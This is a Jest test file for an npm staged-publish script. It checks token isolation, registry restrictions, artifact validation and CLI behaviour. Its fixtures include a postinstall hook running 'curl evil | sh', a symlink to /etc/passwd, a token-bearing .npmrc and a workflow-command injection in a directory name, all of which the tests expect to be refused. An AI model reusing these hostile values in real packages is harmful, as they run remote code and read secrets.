/**
 * The publish-only side: what `npm publish` is given (arguments, environment,
 * working directory, config), how refused artifacts and failures are reported,
 * and the CLI wrapper. `npm` is injected for the precise assertions and run
 * for real (with --dry-run) for the CLI.
 */
import {
  mkdirSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import path from 'node:path';

import {
  afterAll,
  afterEach,
  beforeEach,
  describe,
  expect,
  it,
  jest,
} from '@jest/globals';
import semver from 'semver';

import { DepUp } from '../depup.mjs';
import {
  buildPublishArguments,
  buildPublishEnvironment,
  chooseTag,
  createResultsWriter,
  DEFAULT_REGISTRY,
  isAlreadyPublished,
  main,
  normalizeRegistry,
  publishExitCode,
  publishStagedPackages,
  summarizeResults,
  writeNpmConfig,
} from '../staged-publish.mjs';

import {
  packageJsonFor,
  temporaryDirectory,
  validEntries,
  writeStagedPackage,
} from './helpers/staged-fixtures.js';

const created = [];
const scratch = () => {
  const directory = temporaryDirectory('staged-publish-');
  created.push(directory);
  return directory;
};

afterAll(() => {
  for (const directory of created) {
    rmSync(directory, { force: true, recursive: true });
  }
});

const TOKEN = 'npm_FAKE_TOKEN_for_unit_tests_0123456789';
const environment = {
  BOT_PAT: 'bot-pat-value',
  GH_TOKEN: 'gh-token-value',
  GITHUB_ENV: '/home/runner/work/_temp/_runner_file_commands/set_env',
  GITHUB_TOKEN: 'github-token-value',
  GPG_PRIVATE_KEY: 'gpg-key-value',
  HOME: '/home/runner',
  NODE_AUTH_TOKEN: TOKEN,
  NPM_TOKEN: 'a-different-npm-token',
  PATH: '/usr/bin:/bin',
};

// Records every `npm` invocation instead of running npm.
const fakeNpm = (behaviour = () => {}) => {
  const calls = [];
  const run = async (invocation) => {
    const snapshot = {
      ...invocation,
      cwdEntries: readdirSync(invocation.cwd),
      userconfig: readFileSync(
        invocation.args[invocation.args.indexOf('--userconfig') + 1],
        'utf8',
      ),
      userconfigMode:
        statSync(invocation.args[invocation.args.indexOf('--userconfig') + 1])
          .mode & 0o777,
    };
    calls.push(snapshot);
    await behaviour(snapshot, calls.length);
  };
  return { calls, run };
};

const stagedRoot = (...packages) => {
  const root = scratch();
  for (const name of packages) {
    writeStagedPackage(root, {
      packageJson: packageJsonFor({ originalName: name }),
    });
  }
  return root;
};

describe('tag choice', () => {
  it.each([
    ['1.2.3-depup.0', 'latest'],
    ['1.0.0-beta.1-depup.3', 'latest'],
    ['1.0.0', 'latest'],
    ['1.0.0-beta.1', 'beta'],
    ['1.0.0-rc.2+build.5', 'beta'],
  ])('%s -> %s', (version, tag) => {
    expect(chooseTag(version)).toBe(tag);
  });

  it('agrees with the rule depup.mjs applies when it publishes directly', () => {
    const depup = new DepUp();
    for (const version of [
      '1.2.3-depup.0',
      '1.0.0-beta.1-depup.3',
      '2.0.0-depup.12',
      '1.0.0-beta.1',
      '3.1.4',
    ]) {
      const identifiers = semver.prerelease(version);
      const direct = depup.isDepupPrereleaseVersion(identifiers)
        ? 'latest'
        : identifiers === null
          ? 'latest'
          : 'beta';

      expect([version, chooseTag(version)]).toEqual([version, direct]);
    }
  });
});

describe('registry and npm config', () => {
  it('only lets https registries (or loopback http) receive the token', () => {
    expect(normalizeRegistry(DEFAULT_REGISTRY).href).toBe(
      'https://registry.npmjs.org/',
    );
    expect(normalizeRegistry('http://127.0.0.1:4873/').host).toBe(
      '127.0.0.1:4873',
    );
    expect(normalizeRegistry('http://localhost:1/').hostname).toBe('localhost');

    for (const bad of [
      'http://registry.example.com/',
      'ftp://registry.example.com/',
      'file:///tmp/registry',
      'not a url',
    ]) {
      expect(() => normalizeRegistry(bad)).toThrow();
    }
  });

  it('writes a user config that names the registry and reads the token from the environment', async () => {
    const directory = scratch();
    const config = await writeNpmConfig(
      directory,
      'http://127.0.0.1:4873/custom',
    );
    const text = readFileSync(config.userconfig, 'utf8');

    expect(text).toContain('registry=http://127.0.0.1:4873/custom');
    expect(text).toContain(
      '//127.0.0.1:4873/custom/:_authToken=${NODE_AUTH_TOKEN}',
    );
    expect(text).toContain('ignore-scripts=true');
    expect(text).not.toMatch(/npm_|[A-Za-z0-9]{30,}/u);
    expect(statSync(config.userconfig).mode & 0o777).toBe(0o600);
    expect(readFileSync(config.globalconfig, 'utf8')).toBe('');
    expect(config.registry).toBe('http://127.0.0.1:4873/custom');
  });
});

describe('arguments and environment of npm publish', () => {
  const config = {
    globalconfig: '/work/npmrc-global',
    registry: 'https://registry.npmjs.org/',
    userconfig: '/work/npmrc',
  };

  it('publishes the staged tarball by absolute path with --ignore-scripts and an explicit registry', () => {
    expect(
      buildPublishArguments({
        config,
        tarballPath: 'relative/package.tgz',
        version: '1.2.3-depup.0',
      }),
    ).toEqual([
      'publish',
      path.resolve('relative/package.tgz'),
      '--access',
      'public',
      '--tag',
      'latest',
      '--ignore-scripts',
      '--registry',
      'https://registry.npmjs.org/',
      '--userconfig',
      '/work/npmrc',
      '--globalconfig',
      '/work/npmrc-global',
    ]);
  });

  it('adds --dry-run only when asked', () => {
    const base = {
      config,
      tarballPath: '/s/package.tgz',
      version: '1.0.0-depup.0',
    };

    expect(buildPublishArguments({ ...base, dryRun: true }).at(-1)).toBe(
      '--dry-run',
    );
    expect(buildPublishArguments(base)).not.toContain('--dry-run');
  });

  it('hands npm the publish token and no other credential', () => {
    const result = buildPublishEnvironment(environment, 'THE-TOKEN');

    expect(result.NODE_AUTH_TOKEN).toBe('THE-TOKEN');
    expect(result.PATH).toBe('/usr/bin:/bin');
    expect(result.HOME).toBe('/home/runner');
    expect(result.npm_config_ignore_scripts).toBe('true');

    for (const name of [
      'NPM_TOKEN',
      'GH_TOKEN',
      'GITHUB_TOKEN',
      'BOT_PAT',
      'GPG_PRIVATE_KEY',
      'GITHUB_ENV',
    ]) {
      expect(result).not.toHaveProperty(name);
    }

    expect(JSON.stringify(result)).not.toContain(TOKEN);
    expect(JSON.stringify(result)).not.toContain('a-different-npm-token');
  });
});

describe('publishing staged packages', () => {
  it('runs npm once per package with the exact arguments, a clean working directory and the token only in env', async () => {
    const root = stagedRoot('lodash');
    const npm = fakeNpm();
    const results = await publishStagedPackages({
      environment,
      expectedPackages: ['lodash'],
      runNpm: npm.run,
      stageDirectory: root,
    });

    expect(results).toEqual([
      {
        baseVersion: '1.2.3',
        originalName: 'lodash',
        outcome: 'published',
        revision: 0,
        scopedName: '@depup/lodash',
        version: '1.2.3-depup.0',
      },
    ]);
    expect(npm.calls).toHaveLength(1);

    const [call] = npm.calls;
    const tarball = path.join(root, 'lodash@1.2.3-depup.0', 'package.tgz');

    expect(call.args.slice(0, 2)).toEqual(['publish', tarball]);
    expect(call.args).toEqual(
      expect.arrayContaining([
        '--ignore-scripts',
        '--access',
        'public',
        '--tag',
        'latest',
      ]),
    );
    expect(call.args[call.args.indexOf('--registry') + 1]).toBe(
      'https://registry.npmjs.org/',
    );
    // npm resolves project config from its cwd: it must be empty and not inside
    // the stage tree, so nothing a package ships can sit there.
    expect(call.cwdEntries).toEqual([]);
    expect(path.relative(root, call.cwd).startsWith('..')).toBe(true);
    expect(call.env.NODE_AUTH_TOKEN).toBe(TOKEN);
    expect(call.env).not.toHaveProperty('NPM_TOKEN');
    expect(call.env).not.toHaveProperty('GH_TOKEN');
    expect(call.env).not.toHaveProperty('GPG_PRIVATE_KEY');
    // The token never reaches the arguments or the config file on disk.
    expect(JSON.stringify(call.args)).not.toContain(TOKEN);
    expect(call.userconfig).not.toContain(TOKEN);
    expect(call.userconfigMode).toBe(0o600);
    expect(call.timeout).toBe(120_000);
  });

  it('removes its temporary config and working directories afterwards', async () => {
    const npm = fakeNpm();
    await publishStagedPackages({
      environment,
      runNpm: npm.run,
      stageDirectory: stagedRoot('lodash'),
    });
    const userconfig =
      npm.calls[0].args[npm.calls[0].args.indexOf('--userconfig') + 1];

    expect(() => statSync(userconfig)).toThrow();
    expect(() => statSync(npm.calls[0].cwd)).toThrow();
  });

  it('prefers NODE_AUTH_TOKEN, falls back to NPM_TOKEN, and requires one unless dry-running', async () => {
    const root = stagedRoot('lodash');
    const npm = fakeNpm();
    await publishStagedPackages({
      environment: { NPM_TOKEN: 'only-npm-token', PATH: '/bin' },
      runNpm: npm.run,
      stageDirectory: root,
    });

    expect(npm.calls[0].env.NODE_AUTH_TOKEN).toBe('only-npm-token');
    await expect(
      publishStagedPackages({
        environment: { PATH: '/bin' },
        runNpm: npm.run,
        stageDirectory: root,
      }),
    ).rejects.toThrow(/NPM_TOKEN/u);

    const dry = fakeNpm();
    const results = await publishStagedPackages({
      dryRun: true,
      environment: { PATH: '/bin' },
      runNpm: dry.run,
      stageDirectory: root,
    });

    expect(results[0].outcome).toBe('dry-run');
    expect(dry.calls[0].args).toContain('--dry-run');
  });

  it('refuses a registry that is not https (before any token is handed over)', async () => {
    await expect(
      publishStagedPackages({
        environment,
        registry: 'http://registry.example.com/',
        runNpm: fakeNpm().run,
        stageDirectory: stagedRoot('lodash'),
      }),
    ).rejects.toThrow(/non-https/u);
  });

  it('refuses artifacts that fail validation without running npm for them, and still publishes the rest', async () => {
    const root = stagedRoot('lodash', 'express');
    // A directory with an extra file, a loose file and a symlink.
    const bad = writeStagedPackage(root, {
      packageJson: packageJsonFor({ originalName: 'bad' }),
    });
    writeFileSync(path.join(bad, 'extra.sh'), 'x');
    writeFileSync(path.join(root, 'loose.txt'), 'x');
    symlinkSync(root, path.join(root, 'link'));
    const npm = fakeNpm();

    const results = await publishStagedPackages({
      environment,
      runNpm: npm.run,
      stageDirectory: root,
    });

    expect(npm.calls).toHaveLength(2);
    expect(
      results.filter((entry) => entry.outcome === 'published'),
    ).toHaveLength(2);
    expect(
      results
        .filter((entry) => entry.outcome === 'rejected')
        .map((entry) => entry.stagedDirectory)
        .toSorted(),
    ).toEqual(['bad@1.2.3-depup.0', 'link', 'loose.txt']);
  });

  it('refuses a package that is not in the expected set', async () => {
    const npm = fakeNpm();
    const results = await publishStagedPackages({
      environment,
      expectedPackages: ['lodash'],
      runNpm: npm.run,
      stageDirectory: stagedRoot('lodash', 'express'),
    });

    expect(npm.calls).toHaveLength(1);
    expect(
      results.map((entry) => [
        entry.stagedDirectory ?? entry.originalName,
        entry.outcome,
      ]),
    ).toEqual([
      ['express@1.2.3-depup.0', 'rejected'],
      ['lodash', 'published'],
    ]);
  });

  it('refuses a tarball with a symlink, a .npmrc or a lifecycle script at publish time', async () => {
    const root = scratch();
    const names = ['linked', 'npmrc', 'scripted'];
    writeStagedPackage(root, {
      entries: validEntries(packageJsonFor({ originalName: 'linked' }), [
        { linkname: '/etc/passwd', path: 'package/l', type: '2' },
      ]),
      packageJson: packageJsonFor({ originalName: 'linked' }),
    });
    writeStagedPackage(root, {
      entries: validEntries(packageJsonFor({ originalName: 'npmrc' }), [
        { content: '//x/:_authToken=y', path: 'package/.npmrc' },
      ]),
      packageJson: packageJsonFor({ originalName: 'npmrc' }),
    });
    const scripted = packageJsonFor({
      originalName: 'scripted',
      scripts: { postinstall: 'curl evil | sh' },
    });
    writeStagedPackage(root, {
      entries: validEntries(scripted),
      packageJson: scripted,
    });
    const npm = fakeNpm();

    const results = await publishStagedPackages({
      environment,
      runNpm: npm.run,
      stageDirectory: root,
    });

    expect(npm.calls).toHaveLength(0);
    expect(results).toHaveLength(names.length);
    expect(results.every((entry) => entry.outcome === 'rejected')).toBe(true);
  });

  it('records "already published" as a success', async () => {
    for (const message of [
      'npm error code EPUBLISHCONFLICT',
      'npm error You cannot publish over the previously published versions: 1.2.3-depup.0',
    ]) {
      const results = await publishStagedPackages({
        environment,
        runNpm: async () => {
          throw Object.assign(new Error('Command failed'), {
            stderr: Buffer.from(message),
          });
        },
        stageDirectory: stagedRoot('lodash'),
      });

      expect(results[0].outcome).toBe('already-published');
    }
  });

  it('finds the conflict marker anywhere in the cause chain', () => {
    const inner = new Error('403 cannot publish over the previously published');

    expect(isAlreadyPublished(new Error('outer', { cause: inner }))).toBe(true);
    expect(isAlreadyPublished(new Error('E404 not found'))).toBe(false);
    expect(isAlreadyPublished()).toBe(false);
  });

  it('reports other failures on one line with the token masked and the length capped', async () => {
    const results = await publishStagedPackages({
      environment,
      runNpm: async () => {
        throw new Error(
          `npm error 401\nBearer ${TOKEN} rejected\n${'x'.repeat(2000)}`,
        );
      },
      stageDirectory: stagedRoot('lodash'),
    });
    const [failure] = results;

    expect(failure.outcome).toBe('failed');
    expect(failure.error).not.toContain(TOKEN);
    expect(failure.error).not.toContain('\n');
    expect(failure.error).toContain('Bearer *** rejected');
    expect(failure.error.length).toBeLessThanOrEqual(503);
  });

  it('never runs more publishes at once than the concurrency limit', async () => {
    const root = stagedRoot('a', 'b', 'c', 'd', 'e', 'f', 'g');
    let inFlight = 0;
    let peak = 0;
    const npm = fakeNpm(async () => {
      inFlight += 1;
      peak = Math.max(peak, inFlight);
      await new Promise((resolve) => {
        setTimeout(resolve, 20);
      });
      inFlight -= 1;
    });

    const results = await publishStagedPackages({
      concurrency: 3,
      environment,
      runNpm: npm.run,
      stageDirectory: root,
    });

    expect(results).toHaveLength(7);
    expect(peak).toBeGreaterThan(1);
    expect(peak).toBeLessThanOrEqual(3);
  });

  it('treats a missing stage directory as nothing staged', async () => {
    await expect(
      publishStagedPackages({
        environment,
        runNpm: fakeNpm().run,
        stageDirectory: path.join(scratch(), 'nothing'),
      }),
    ).resolves.toEqual([]);
  });
});

describe('results are written as packages finish', () => {
  it('reports every result to onResult as soon as it is known, refused ones first', async () => {
    const root = stagedRoot('a', 'b');
    writeFileSync(path.join(root, 'loose.txt'), 'x');
    const seen = [];

    const results = await publishStagedPackages({
      environment,
      onResult: async (result) => {
        seen.push(result.outcome);
      },
      runNpm: fakeNpm().run,
      stageDirectory: root,
    });

    expect(seen).toEqual(['rejected', 'published', 'published']);
    expect(results).toHaveLength(3);
  });

  it('rewrites the results file on every addition, so a killed run keeps what it finished', async () => {
    const file = path.join(scratch(), 'nested', 'results.json');
    const writer = createResultsWriter(file);
    const read = () => JSON.parse(readFileSync(file, 'utf8')).results;

    await writer.add({ outcome: 'published', version: '1' });

    expect(read()).toEqual([{ outcome: 'published', version: '1' }]);

    await writer.add({ outcome: 'failed', version: '2' });

    expect(read().map((entry) => entry.version)).toEqual(['1', '2']);

    await writer.finish([{ outcome: 'published', version: 'final' }]);

    expect(read()).toEqual([{ outcome: 'published', version: 'final' }]);
  });

  it('keeps concurrent additions in order and loses none', async () => {
    const file = path.join(scratch(), 'results.json');
    const writer = createResultsWriter(file);

    await Promise.all(
      Array.from({ length: 25 }, (_, index) =>
        writer.add({ outcome: 'published', version: String(index) }),
      ),
    );

    expect(JSON.parse(readFileSync(file, 'utf8')).results).toHaveLength(25);
  });
});

describe('summary and exit status', () => {
  const entry = (outcome) => ({ outcome });
  const results = (...outcomes) => outcomes.map((outcome) => entry(outcome));

  it('summarizes counts in a machine-readable line', () => {
    expect(
      summarizeResults(
        results(
          'published',
          'published',
          'already-published',
          'failed',
          'rejected',
          'dry-run',
        ),
      ),
    ).toBe(
      'DEPUP_PUBLISH_SUMMARY published=2 alreadypublished=1 dryrun=1 failed=1 rejected=1',
    );
  });

  it('is 0 when everything published and 1 for any refused artifact', () => {
    expect(publishExitCode(results('published', 'already-published'))).toBe(0);
    expect(publishExitCode(results('published', 'rejected'))).toBe(1);
    expect(
      publishExitCode(results('published', 'rejected'), {
        tolerateFailures: true,
      }),
    ).toBe(1);
  });

  it('is strict about failures unless failures are tolerated', () => {
    expect(publishExitCode(results('published', 'failed'))).toBe(1);
    expect(
      publishExitCode(results('published', 'failed'), {
        tolerateFailures: true,
      }),
    ).toBe(0);
  });

  it('only fails a tolerant run on a systemic failure (over half of 10 or more)', () => {
    const many = (failed, total) =>
      results(
        ...Array.from({ length: total }, (_, index) =>
          index < failed ? 'failed' : 'published',
        ),
      );

    expect(publishExitCode(many(9, 9), { tolerateFailures: true })).toBe(0);
    expect(publishExitCode(many(5, 10), { tolerateFailures: true })).toBe(0);
    expect(publishExitCode(many(6, 10), { tolerateFailures: true })).toBe(1);
  });

  it('requires staged packages only when asked', () => {
    expect(publishExitCode([], {})).toBe(0);
    expect(publishExitCode([], { requireStaged: true })).toBe(1);
  });
});

describe('command line', () => {
  let logged;
  let errors;

  beforeEach(() => {
    logged = [];
    errors = [];
    jest
      .spyOn(console, 'log')
      .mockImplementation((...parts) => logged.push(parts.join(' ')));
    jest
      .spyOn(console, 'error')
      .mockImplementation((...parts) => errors.push(parts.join(' ')));
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  it('prints usage and exits 2 for an unknown command', async () => {
    await expect(main(['frobnicate'], environment)).resolves.toBe(2);
    await expect(main([], environment)).resolves.toBe(2);
    expect(errors.join('\n')).toContain('usage: staged-publish.mjs');
  });

  it('exits 2 for missing arguments and unknown options', async () => {
    await expect(main(['publish-staged'], environment)).resolves.toBe(2);
    await expect(
      main(['publish-staged', scratch()], environment),
    ).resolves.toBe(2);
    await expect(main(['collect-data'], environment)).resolves.toBe(2);
    await expect(main(['import-data'], environment)).resolves.toBe(2);
    await expect(main(['finalize-integrity'], environment)).resolves.toBe(2);
    await expect(main(['publish-staged', '--nope'], environment)).resolves.toBe(
      2,
    );
  });

  it('publish-staged --dry-run validates, writes results and a summary, against real npm', async () => {
    const root = stagedRoot('lodash');
    const resultsFile = path.join(scratch(), 'out', 'results.json');

    const code = await main(
      [
        'publish-staged',
        root,
        '--results',
        resultsFile,
        '--dry-run',
        '--expect-package',
        'lodash',
      ],
      { HOME: process.env.HOME, PATH: process.env.PATH },
    );

    expect(code).toBe(0);
    expect(logged).toContain(
      'DEPUP_PUBLISH_SUMMARY published=0 alreadypublished=0 dryrun=1 failed=0 rejected=0',
    );
    expect(JSON.parse(readFileSync(resultsFile, 'utf8'))).toMatchObject({
      results: [{ originalName: 'lodash', outcome: 'dry-run' }],
      schema: 1,
    });
  }, 60_000);

  it.each(['0', '17', 'abc', '1.5', '=-1'])(
    'rejects --concurrency %s',
    async (value) => {
      const code = await main(
        [
          'publish-staged',
          stagedRoot('lodash'),
          '--results',
          path.join(scratch(), 'r.json'),
          '--dry-run',
          '--concurrency',
          value,
        ],
        { PATH: process.env.PATH },
      );

      expect(code).toBe(2);
      expect(errors.join('\n')).toContain(
        '--concurrency must be an integer from 1 to 16',
      );
    },
  );

  it('cannot be made to print a workflow command through an artifact name', async () => {
    const root = scratch();
    mkdirSync(path.join(root, 'evil\n::set-output name=pwn::yes'));
    const resultsFile = path.join(scratch(), 'results.json');

    const code = await main(
      ['publish-staged', root, '--results', resultsFile, '--dry-run'],
      { PATH: process.env.PATH },
    );
    const lines = logged.join('\n').split('\n');

    expect(code).toBe(1);
    expect(lines.filter((line) => line.startsWith('::set-output'))).toEqual([]);
    expect(
      lines.filter((line) => line.startsWith('::error::Refused')),
    ).toHaveLength(1);
  });

  it('annotates refused artifacts and exits 1', async () => {
    const root = stagedRoot('lodash');
    const resultsFile = path.join(scratch(), 'results.json');

    const code = await main(
      [
        'publish-staged',
        root,
        '--results',
        resultsFile,
        '--dry-run',
        '--expect-package',
        'other',
      ],
      { HOME: process.env.HOME, PATH: process.env.PATH },
    );

    expect(code).toBe(1);
    expect(
      logged.some((line) => line.startsWith('::error::Refused staged package')),
    ).toBe(true);
  });

  it('--require-staged fails an empty stage directory, an optional one does not', async () => {
    const empty = scratch();
    const resultsFile = path.join(scratch(), 'results.json');
    const run = (...extra) =>
      main(
        [
          'publish-staged',
          empty,
          '--results',
          resultsFile,
          '--dry-run',
          ...extra,
        ],
        { PATH: process.env.PATH },
      );

    await expect(run()).resolves.toBe(0);
    await expect(run('--require-staged')).resolves.toBe(1);
  });

  it('import-data tolerates a missing hand-over and reports a rejected package', async () => {
    await expect(
      main(['import-data', path.join(scratch(), 'absent')], environment),
    ).resolves.toBe(0);
    expect(logged.join('\n')).toContain('nothing to import');

    const input = scratch();
    mkdirSync(path.join(input, 'files', 'lodash'), { recursive: true });
    writeFileSync(
      path.join(input, 'files', 'lodash', 'README.md'),
      '# only a readme',
    );
    const packages = path.join(scratch(), 'packages');
    mkdirSync(packages);

    await expect(
      main(['import-data', input, '--packages-root', packages], environment),
    ).resolves.toBe(0);
    expect(logged.join('\n')).toContain(
      '::warning::Package data rejected for lodash: no integrity.json',
    );
    expect(logged.at(-1)).toBe(
      'DEPUP_IMPORT_SUMMARY packages=0 files=0 deleted=0 rejected=1',
    );
  });

  it('finalize-integrity flips a confirmed revision in a single package directory', async () => {
    const directory = scratch();
    writeFileSync(
      path.join(directory, 'integrity.json'),
      JSON.stringify({
        '1.2.3': { 0: { status: 'failed', version: '1.2.3-depup.0' } },
      }),
    );
    const resultsFile = path.join(scratch(), 'results.json');
    writeFileSync(
      resultsFile,
      JSON.stringify({
        results: [
          {
            baseVersion: '1.2.3',
            originalName: 'lodash',
            outcome: 'published',
            revision: 0,
            scopedName: '@depup/lodash',
            version: '1.2.3-depup.0',
          },
        ],
        schema: 1,
      }),
    );
    const flags = ['--results', resultsFile, '--package-directory', directory];

    await expect(
      main(['finalize-integrity', ...flags, '--package', 'other'], environment),
    ).resolves.toBe(0);
    expect(
      JSON.parse(readFileSync(path.join(directory, 'integrity.json'), 'utf8'))[
        '1.2.3'
      ]['0'].status,
    ).toBe('failed');
    await expect(
      main(
        ['finalize-integrity', ...flags, '--package', 'lodash'],
        environment,
      ),
    ).resolves.toBe(0);
    expect(
      JSON.parse(readFileSync(path.join(directory, 'integrity.json'), 'utf8'))[
        '1.2.3'
      ]['0'].status,
    ).toBe('published');
    expect(logged.at(-1)).toBe(
      'DEPUP_FINALIZE_SUMMARY published=1 unchanged=0 missing=0',
    );
  });

  it('finalize-integrity tolerates absent results unless they are required', async () => {
    const root = path.join(scratch(), 'packages');
    mkdirSync(root);
    const missing = path.join(scratch(), 'none.json');

    await expect(
      main(
        ['finalize-integrity', '--results', missing, '--packages-root', root],
        environment,
      ),
    ).resolves.toBe(0);
    expect(logged.join('\n')).toContain('stay unconfirmed');
    await expect(
      main(
        [
          'finalize-integrity',
          '--results',
          missing,
          '--packages-root',
          root,
          '--require-results',
        ],
        environment,
      ),
    ).resolves.toBe(2);
  });

  it('never prints the publish token, even when the command fails', async () => {
    await main(['publish-staged'], { NODE_AUTH_TOKEN: TOKEN });

    expect([...logged, ...errors].join('\n')).not.toContain(TOKEN);
  });
});
